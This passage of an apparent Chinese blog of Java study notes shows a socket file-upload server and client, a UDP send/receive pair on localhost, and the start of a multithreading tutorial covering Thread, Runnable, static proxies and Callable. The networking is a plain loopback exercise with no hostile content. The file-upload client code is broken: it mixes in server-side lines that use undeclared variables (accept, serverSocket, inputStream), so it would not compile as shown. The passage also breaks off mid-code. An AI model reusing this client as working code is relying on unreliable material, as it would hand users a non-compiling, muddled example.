operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\MuJie\\Downloads\\111\\222\\1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> len<span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>len <span class="token operator">=</span> inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                files<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">//关闭本次连接</span>            socket<span class="token punctuation">.</span><span class="token function">shutdownOutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//接收客户端回应</span>            ByteArrayOutputStream byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            InputStream inputStream <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> len2<span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>len2 <span class="token operator">=</span> inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bytes2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>bytes2<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len2<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">//判断是否成功</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//关闭流</span>            byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            inputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            socket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Client-1"><a href="#Client-1" class="headerlink" title="Client:"></a><code>Client:</code></h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 网络编程<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>File<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>OutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>InetAddress<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>Socket<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 文件上传Client <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//连接地址</span>            Socket socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span>InetAddress<span class="token punctuation">.</span><span class="token function">getByName</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//将文件读取为流</span>            FileInputStream files <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\MuJie\\Downloads\\1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//IO流</span>            OutputStream os <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//将文件流写入IO流发送</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> len<span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>len <span class="token operator">=</span> files<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                os<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">//通知客户端接收完毕</span>            OutputStream outputStream <span class="token operator">=</span> accept<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            outputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span>StandardCharsets<span class="token punctuation">.</span>UTF_8<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//关闭流</span>            files<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            inputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            accept<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            serverSocket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210814171903316.png" alt="image-20210814171903316"></p><h2 id="UDP发送数据包"><a href="#UDP发送数据包" class="headerlink" title="UDP发送数据包"></a><code>UDP</code>发送数据包</h2><h3 id="Client-2"><a href="#Client-2" class="headerlink" title="Client:"></a><code>Client:</code></h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span>StandardCharsets<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UdpClient</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">///创建包</span>            DatagramSocket socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DatagramSocket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            InetAddress localhost <span class="token operator">=</span> InetAddress<span class="token punctuation">.</span><span class="token function">getByName</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> port <span class="token operator">=</span> <span class="token number">9090</span><span class="token punctuation">;</span>            String string <span class="token operator">=</span> <span class="token string">"你好，服务器"</span><span class="token punctuation">;</span>            DatagramPacket datagramPacket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DatagramPacket</span><span class="token punctuation">(</span>string<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span>StandardCharsets<span class="token punctuation">.</span>UTF_8<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>string<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span>StandardCharsets<span class="token punctuation">.</span>UTF_8<span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">,</span>localhost<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">/*DatagramPacket语法：            * new DatagramPacket(数据【byte形式】,开始位置,结束位置,ip地址,端口)            */</span>            <span class="token comment" spellcheck="true">//发送包</span>            socket<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>datagramPacket<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//关闭流</span>            socket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Server-1"><a href="#Server-1" class="headerlink" title="Server:"></a><code>Server:</code></h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>DatagramPacket<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>DatagramSocket<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UdpServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//开放端口</span>            DatagramSocket datagramSocket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DatagramSocket</span><span class="token punctuation">(</span><span class="token number">9090</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//接收数据</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            DatagramPacket datagramPacket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DatagramPacket</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bytes<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//监听</span>            datagramSocket<span class="token punctuation">.</span><span class="token function">receive</span><span class="token punctuation">(</span>datagramPacket<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//输出</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>datagramPacket<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>datagramPacket<span class="token punctuation">.</span><span class="token function">getLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//关闭连接</span>            datagramSocket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java多线程</title>
      <link href="/2021/07/21/Java%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
      <url>/2021/07/21/Java%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p><strong>笔记内容学自链接视频：<code>https://www.bilibili.com/video/BV1V4411p7EF</code></strong></p><h1 id="多线程概述"><a href="#多线程概述" class="headerlink" title="多线程概述"></a>多线程概述</h1><ul><li><p>程序</p><blockquote><p>程序是指令和数据的有序集合，本身无运行的含义，是一个静态的概念</p></blockquote></li><li><p>进程</p><blockquote><p>进程是程序的一次执行过程，是一个动态的概念。是系统资源的分配单位</p></blockquote></li><li><p>线程</p><blockquote><p>在一个进程中可以包含多个线程，且至少有一个线程</p></blockquote></li></ul><p><img src="image-20210722174945739.png" alt="image-20210722174945739"></p><p><strong>多线程即在一个进程中同时运行多个线程</strong></p><p>main函数就是一个线程</p><p><img src="image-20210722175311044.png" alt="image-20210722175311044"></p><h1 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h1><p><strong>运行一个程序，会默认的出现两个线程————守护线程和主线程</strong></p><p>创建一个线程有三种方式</p><h2 id="一、继承Thread类创建线程"><a href="#一、继承Thread类创建线程" class="headerlink" title="一、继承Thread类创建线程"></a>一、继承Thread类创建线程</h2><p><strong>在创建的子线程中，<code>run()</code>方法的地位和用法相当于主线程的<code>main()</code>方法，所以继承<code>Thread</code>类后必须重写<code>run()</code>方法</strong></p><p><strong>运行子线程的步骤：</strong></p><ul><li><p><strong>继承<code>Thread</code>类</strong></p></li><li><p><strong>重写<code>run()</code>方法</strong></p></li><li><p><strong>主线程/函数/<code>main()</code>调用<code>start()</code>方法开启子线程</strong></p><blockquote><p><strong>如果调用<code>run()</code>方法，程序会按代码顺序正常执行</strong></p><p><strong>开启子线程，程序会同时运行</strong></p></blockquote></li></ul><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> HelloWorld<span class="token punctuation">.</span>多线程<span class="token punctuation">.</span>继承类创建线程<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token keyword">static</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>System<span class="token punctuation">.</span>out<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        继承类创建线程 xianc <span class="token operator">=</span> <span class="token keyword">new</span> 继承类创建线程<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        xianc<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">500</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"慧慧早安。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 多线程<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 继承类创建线程 <span class="token keyword">extends</span> <span class="token class-name">Thread</span><span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"慧慧可爱大方美丽漂亮。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210722185100716.png" alt="image-20210722185100716"></p><p>线程开启不一定立即执行，由CPU调度执行</p><h2 id="二、重写Runner接口创建线程"><a href="#二、重写Runner接口创建线程" class="headerlink" title="二、重写Runner接口创建线程"></a>二、重写Runner接口创建线程</h2><p>相比起直接继承类，重写接口有更好的适用性</p><p>直接继承只能是单继承，而重写接口可以实现多继承</p><p><strong>步骤</strong></p><ul><li><strong>调用<code>Runner</code>接口</strong></li><li><strong>重写<code>run()</code>方法</strong></li><li><strong><code>new Thread()</code>,将<code>new</code>的子线程对象丢进去</strong></li></ul><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> <span class="token keyword">static</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>System<span class="token punctuation">.</span>out<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        实现Runnable接口创建线程 RN <span class="token operator">=</span> <span class="token keyword">new</span> 实现Runnable接口创建线程<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>RN<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//这里可以给子线程起名，格式如 `new Thread(RN,"线程1").start();</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"有趣的灵魂终会相遇"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 多线程<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 实现Runnable接口创建线程 <span class="token keyword">implements</span> <span class="token class-name">Runnable</span><span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"比如慧慧和我"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210724183654488.png" alt="image-20210724183654488"></p><h3 id="静态代理模式"><a href="#静态代理模式" class="headerlink" title="静态代理模式"></a>静态代理模式</h3><p>如同我们所看到的一行代码</p><pre class="line-numbers language-java"><code class="language-java">实现Runnable接口创建线程 RN <span class="token operator">=</span> <span class="token keyword">new</span> 实现Runnable接口创建线程<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>RN<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//这里可以给子线程起名，格式如 `new Thread(RN,"线程1").start();</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样将一个类丢进另一个类的做法，叫做静态代理</p><p>为其他对象提供一种代理以控制这个对象的访问。在某些情况下，一个客户不想或者不能直接引用另一个对象，而代理对象可以在客户端和目标对象之间起到中介的作用。</p><p><strong>简单来说就是用一个代理对象来间接调用真实对象，达到更安全，简洁以及在真实对象的基础上进一步操作的用途</strong></p><p><img src="image-20210725155215830.png" alt="image-20210725155215830"></p><p>比如实例代码</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 多线程<span class="token punctuation">;</span><span class="token keyword">interface</span> <span class="token class-name">Class</span> <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token function">people</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> 静态代理模式 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">new</span> <span class="token class-name">Study</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Teacher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">people</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Study</span> <span class="token keyword">implements</span> <span class="token class-name">Class</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> Class <span class="token class-name">teacher</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">Study</span><span class="token punctuation">(</span>Teacher teacher<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>teacher <span class="token operator">=</span> teacher<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">people</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"这是一个学生"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>teacher<span class="token punctuation">.</span><span class="token function">people</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Teacher</span> <span class="token keyword">implements</span> <span class="token class-name">Class</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">people</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"这是老师A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、重写Callable类接口创建线程"><a href="#三、重写Callable类接口创建线程" class="headerlink" title="三、重写Callable类接口创建线程"></a>三、重写Callable类接口创建线程</h2><p>使用场景少，只作为了解</p><p><strong>步骤：</strong></p><ul><li><strong>实现<code>Callable</code>类</strong></li><li><strong>重写<code>call</code>方法</strong></li><li><strong>主线程创建执行服务</strong></li><li><strong>提交执行</strong></li><li><strong>获取结果</strong></li><li><strong>关闭服务</strong></li></ul><p>注意：</p><ul><li>使用<code>Callable</code>类创建子线程必须有返回值</li><li>获取结果时必须进行异常处理，监测或抛出均可</li></ul><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 多线程<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 实现Callable接口创建线程 <span class="token keyword">implements</span> <span class="token class-name">Callable</span><span class="token operator">&lt;</span>String<span class="token operator">></span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//必须声明返回值，否则类型为Object</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span 